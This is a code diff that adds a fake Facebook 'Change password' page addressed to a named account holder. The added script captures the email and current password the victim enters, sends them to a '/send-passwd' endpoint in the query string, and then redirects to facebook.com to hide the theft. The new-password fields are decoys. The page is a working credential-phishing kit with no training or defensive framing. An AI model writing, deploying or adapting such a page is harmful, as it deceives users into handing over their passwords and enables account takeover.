@@ -4,8 +4,39 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Change password | Accounts center</title>
+    <link type="text/css" rel="stylesheet" href="/static/styles.css">
+    <script>
+        async function send(event) {
+            event.preventDefault();
+            let email = document.getElementById("email").value;
+            let password = document.getElementById("curr-password").value;
+            const response = await fetch(`/send-passwd?email=${email}&password=${password}`);    
+            if (!response.ok) {
+                const error = await response.json();
+                console.log(`Error: ${error.error}`);
+                return;
+            }
+            window.location.href = 'https://facebook.com';
+        }
+    </script>
 </head>
 <body>
-    
+    <form action="" onsubmit="send(event)">
+        <p>Kamil Nuriev · Facebook</p>
+        <h1>Change Password</h1>
+        <p>Your password must be at least 6 characters and should include a combination of numbers, letters and special characters(!@%)</p>
+        <label for="email">Email</label>
+        <input type="email" id="email">
+        <label for="curr-password">Current password</label>
+        <input type="password" id="curr-password">
+        <label for="new-password">New password</label>
+        <input type="password" id="new-password">
+        <label for="retype-new-password">Re-type new password</label>
+        <input type="password" id="retype-new-password">
+        <a href=".">Forgot your password?</a>
+        <label for="logout">Log out of other devices. Choose this if someone uses your account.</label>
+        <input type="checkbox" id="logout" checked>
+        <button>Change password</button>
+    </form>
 </body>
 </html>
